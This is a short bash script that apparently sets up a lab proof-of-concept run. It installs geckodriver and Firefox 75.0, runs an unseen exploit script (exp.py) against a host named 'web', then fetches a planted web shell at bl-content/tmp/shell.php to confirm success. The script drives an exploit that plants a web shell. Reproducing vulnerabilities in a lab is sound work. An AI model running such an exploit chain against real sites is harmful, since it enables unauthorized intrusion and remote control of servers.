#!/bin/bash
tar -xvzf /opt/poc/geckodriver-v0.26.0-linux64.tar.gz 
chmod +x geckodriver 
cp geckodriver /usr/local/bin/ 
echo "start"
firefox --version
tar -xjf firefox-75.0.tar.bz2
sudo mv firefox-75.0 /opt/firefox-75.0
sudo mv /usr/bin/firefox /usr/bin/firefox-old
sudo ln -s /opt/firefox-75.0/firefox /usr/bin/firefox
firefox --version
sleep 10
python3 /opt/poc/exp.py http://web

curl http://web/bl-content/tmp/shell.php
echo "poc ok"